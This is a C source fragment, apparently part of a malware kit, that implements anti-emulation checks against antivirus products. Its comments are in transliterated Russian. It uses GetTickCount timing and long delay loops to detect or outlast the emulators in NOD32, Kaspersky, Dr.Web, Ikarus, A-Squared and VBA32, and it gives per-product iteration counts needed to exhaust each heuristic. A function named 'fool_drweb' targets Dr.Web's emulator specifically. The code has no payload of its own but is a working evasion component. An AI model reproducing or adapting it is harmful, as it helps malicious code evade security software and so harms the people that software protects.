
 // ANTI-EMULATIONS
 // supports: NOD32, KAV(win32)
 // + fool_drweb

 DWORD ticks1;
 DWORD EMUL;
 DWORD ticks2; 

 ////////////////////////////////////////
 // pervonachalnii zamer timer ticks
void GetTicks1()
{
	EMUL = 0;
	ticks1 = _GetTickCount() / (100);
}

 ////////////////////////////////////////
 // zamer timera v hode cikla + anti-emul2
void GetTicks2()
{
	DWORD ticks3;

	ticks2 = _GetTickCount() / (100);

	// izmeryaem raznicu mejdu 2 posledovatelnimi GetTickCount
	// esli ona bolshe 100 ms, znachit mi pod emulatorom
	ticks3 = _GetTickCount()/(100);
	if (ticks3 - ticks2 > 1) 
		EMUL = 4096;
}

 ////////////////////////////////////////
 // Zaderjka, snijaet kol-vo vizovov GetTickCount do 2000-3000
DWORD zaderjka_cyklom(DWORD zad)
{
	DWORD q;
	for (q = 0; q < 100000; q++) 
		zad++; 
	return zad;
}

 ////////////////////////////////////////
 // Osnovnoi anti-emul cikl
 // dla NOD hvatilo bi i znacheniya 3
 // dla starogo KAV nado ne menshe 30
 // dla novogo KAV nado ne menshe 70
 // Ikarus     vishibaetsya v GetTicks2
 // A-Squared  vishibaetsya v GetTicks2
 // VBA32 hvataet 2, kogda vstavleno v CheckFunc
// v desyatih dolyah
DWORD AntiEmulator(DWORD time) 
{
	DWORD x;
	DWORD t;
	DWORD zad;

 loopx:;
		
	GetTicks2();

	// zaderjka, snijaet kol-vo vizovov GetTickCount do 2000-3000
	zad = zaderjka_cyklom(zad); 

	t = ticks2 - time; // desyatie doli sec.
	x = ticks2 - ticks1; // desyatie doli sec.

	if (t < ticks1) 
		goto loopx;

	x = x / time;

	// esli net emulatora, x=1
	// pri polnom zavershenii cikla x=AE_VALUE
	// evristika vihodit ranshe, v rezultate x<AE_VALUE
	return x;
}


////////////////////////////////////////
// Fool Dr.Web
// function will take like 0.12 sec 
#define DRWEB_LOOP 100000000

DWORD fool_drweb(DWORD x)  
{
	DWORD i, new_x = x + 8192;

	for (i = 0; i < DRWEB_LOOP; i++)
	{
		// this will not be executed by drweb emulator
		new_x = x; 
	}

	return new_x;
}
 